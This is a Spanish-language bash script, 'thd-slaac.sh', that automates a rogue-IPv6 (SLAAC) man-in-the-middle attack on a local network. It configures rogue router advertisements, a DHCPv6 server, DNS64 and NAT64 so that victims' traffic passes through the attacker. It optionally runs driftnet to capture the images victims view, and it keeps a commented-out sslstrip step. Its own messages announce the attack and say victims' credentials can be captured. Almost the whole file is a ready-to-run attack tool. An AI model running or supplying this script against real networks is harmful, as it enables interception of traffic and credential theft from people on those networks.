#!/bin/bash
# (C)opyright 2014- @jcaitf
# thd-slaac.sh - v1.0
# Visite la pagina http://blog.thehackingday.com
# ****************ADVERTENCIA*******************
# El uso indebido del presente Script es responsabilidad
# unica del usuario.
# ***********************************************

#Variables
NIC=""
IPDOS=""
TVIRTUAL="nat64"
DNS="8.8.8.8"
PREFIX6="2001:db8:1:"
CIDR6="96"
TPREFIX="${PREFIX6}FFFF::/96"
PNAMEDOPT="/etc/bind/named.conf.options"
PRADVDCONF="/etc/radvd.conf"
DIP6="${PREFIX6}:2" 
DIP6CIDR="64"
PDEFDHCP6CONF="/etc/default/wide-dhcpv6-server"
PDHCP6CONF="/etc/wide-dhcpv6/dhcp6s.conf"
DHCPV6DOMAIN="localdomain6"
DHCPV6INI="${PREFIX6}CAFE::10" 
DHCPV6FIN="${PREFIX6}CAFE::0240" 
T4IP="10.10.18.1"
T4SUBNET="10.10.18.0/24"
T6IP="${PREFIX6}:3" 
PTAYGACONF="/etc/tayga.conf"

## Entorno de Red Lan
echo
echo "Bienvenidos al Script thd-slaac.sh v1.0 - Por @jcaitf "
echo
ifconfig |grep "Ethernet"
read -p "Entre el Nombre de la Interface de Ethernet (eth0, eth1, wlan0, ...): " NIC
echo "Estos son los valores para esta interface: "
sipcalc $NIC
# Prompt for second IP on the subnet
read -p "Entre un Ipv4 Adicional Disponible del Rango Antes Mostrado: " IPDOS

echo
echo "Probando Modulo IPv6"
/sbin/modprobe ipv6
# Para Hacerlo Persistente descomentere la siguiente linea y vuelva a ejecutar
#echo 'ipv6' >> /etc/modules
echo "Ok"

echo
echo "Habilitando el Forwarding........."
echo 1 > /proc/sys/net/ipv4/ip_forward
echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
echo "Ok"

echo
echo "Borrando Reglas iptables....."
/sbin/iptables -F
/sbin/iptables -X
/sbin/ip6tables -F
/sbin/ip6tables -X
echo "Ok"

echo
echo "Deteniendo Interfaz Virtual Tayga....."
ip addr flush dev $TVIRTUAL
ip link set $TVIRTUAL down
/usr/sbin/tayga --rmtun
echo "Ok"

#Deteniendo Servicios
echo
echo "Deteniendo Servicios...."
    service bind9 stop
    service wide-dhcpv6-server stop
echo "Ok"

#Extrayendo nameservers de /etc/resolv.conf
    if [ -e "/etc/resolv.conf" ]; then
        NS=`/bin/grep '^nameserver' /etc/resolv.conf | /usr/bin/awk '{print $2}'`
        if [ -z "$NS" ] ; then
           NS="$DNS"
        fi
        BF="${NS};"
fi


# Creando /etc/bind/named.conf.options
echo
echo "Configurando el DNS para IPv6....."
echo "options {
        directory "\"/var/cache/bind\"";
        forwarders {
#           ${BF}
#       en caso de error en la ejecucion de Bind, sera necesario que coloque manualmente el nameserver 
#       que por los general es la misma puerta de enlace en los casos de los Internet Caseros
#       ejm:
#       186.65.16.2;
8.8.8.8;
        };
        dnssec-validation auto;
        auth-nxdomain no;
        listen-on-v6 { any; };
        allow-query { any; };
        dns64 ${TPREFIX} {
                clients { any; };
                exclude { any; };
        };
};" > ${PNAMEDOPT}
echo "Ok"

#Creando /etc/radvd.conf
echo
echo "Configurando el RADvd....."
echo "interface ${NIC}
{
        AdvSendAdvert on;
        MinRtrAdvInterval 3;
        MaxRtrAdvInterval 10;
        AdvHomeAgentFlag off;
        AdvOtherConfigFlag on;
        prefix ${PREFIX6}:/${DIP6CIDR}
        {
                AdvOnLink on;
                AdvAutonomous on;
                AdvRouterAddr off;
        };
        RDNSS ${DIP6}
        {
                AdvRDNSSLifetime 30;
        };
};" > $PRADVDCONF
echo "Ok"

#Creando /etc/default/wide-dhcpv6-server and /etc/wide-dhcpv6/dhcp6s.conf
echo
echo "Configurando el DHCP para IPv6....."
echo "INTERFACES=${NIC}" > $PDEFDHCP6CONF
echo "option domain-name-servers ${DIP6};
option domain-name "\"${DHCPV6DOMAIN}\"";
interface ${NIC} {
   address-pool pool1 3600;
};
pool pool1 {
   range ${DHCPV6INI} to ${DHCPV6FIN};
};" > $PDHCP6CONF
echo "Ok"

#Creando /etc/tayga.conf
echo
echo "Configurando la Interfaz TAYGA....."
echo "tun-device ${TVIRTUAL}
ipv4-addr ${T4IP}
prefix ${TPREFIX}
dynamic-pool ${T4SUBNET}" > $PTAYGACONF
echo "Ok"
sleep 2

#Configurando la Interfaz Tayga, Direcciones IP y Rutas
ip addr add "${DIP6}/${DIP6CIDR}" dev $NIC
#Creando la interfaz nat64 acorde a tayga.conf
/usr/sbin/tayga --mktun
ip link set $TVIRTUAL up
ip addr add $IPDOS dev $TVIRTUAL
ip addr add $T4IP dev $TVIRTUAL
ip route add $T4SUBNET dev $TVIRTUAL
ip addr add $T6IP dev $TVIRTUAL
ip route add $TPREFIX dev $TVIRTUAL
/usr/sbin/tayga 
sleep 5

#Iniciando Servicios
echo
echo "Iniciando Servicios....."
service radvd stop
sleep 3
service radvd start
service bind9 start
service wide-dhcpv6-server start
/sbin/iptables -I FORWARD -j ACCEPT -i $TVIRTUAL -o $NIC
/sbin/iptables -I FORWARD -j ACCEPT -i $NIC -o $TVIRTUAL -m state --state RELATED,ESTABLISHED
/sbin/iptables -t nat -I POSTROUTING -o $NIC -j MASQUERADE
#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
/sbin/ip6tables -A OUTPUT -p icmpv6 --icmpv6-type 1 -j DROP

# Driftnet
echo
echo "[+] Driftnet?"
echo
echo "Desea Habilitar DriftNet para capturar imagenes de las Victimas,
(esto puedo hacer la Red Lenta), "
echo "Y or N "
read DRIFT

if [ $DRIFT = "y" ] ; then
mkdir -p "/var/log/driftnetdata"
echo "[+] Starting driftnet..."
driftnet -i $NIC -d /var/log/driftnetdata & dritnetid=$!
sleep 3
fi

### Sslstrip
#echo
#echo "[+] Sslstrip..."
#echo
#echo "Desea Habilitar SslStrip?"
#echo "Y or N "
#read STRIP
#
#if [ $STRIP = "y" ] ; then
#echo "[+] Configuring iptables for sslstrip..."
#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -p -k 10000 & sslstripid=$!
#sleep 3
#xterm -geometry 75x15+1+600 -T SSLStrip-Log -e tail -f sslstrip.log & sslstriplogid=$!
#fi

clear
echo
echo "[+] Ataque Preparado..."
echo "THD-SLAAC Ahora esta corriendo, una vez las victimas con IPv6 se conecten usted podra capturar sus credenciales a traves de TcpDump o Wiresharp. Tambien es posible visualizar las imagenes vistas por las victimas, si habilito la opcion de Driftnet"
echo
echo "[+] IMPORTANTE..."
echo "Para Finalizar Este Ataque, Presione el cualquier Momento la Tecla Y "
read WISH

if [ $WISH = "y" ] ; then
echo
echo "[+] Terminando el Ataque THD-SLAAC..."

echo
echo "Borrando Reglas iptables....."
/sbin/iptables -F
/sbin/iptables -X
/sbin/ip6tables -F
/sbin/ip6tables -X
echo "Ok"

#Deteniendo Servicios
echo
echo "Deteniendo Servicios...."
service bind9 stop
service wide-dhcpv6-server stop
kill ${dritnetid}
service radvd stop
echo "Ok"

echo
echo "Deteniendo Interfaz Virtual Tayga....."
ip addr flush dev $TVIRTUAL
ip addr del "${DIP6}/${DIP6CIDR}" dev $NIC
ip link set $TVIRTUAL down
killall tayga
/usr/sbin/tayga --rmtun

echo "*****El Ataque THD-SLAAC ha cerrado satisfactoriamente***"

fi
exit

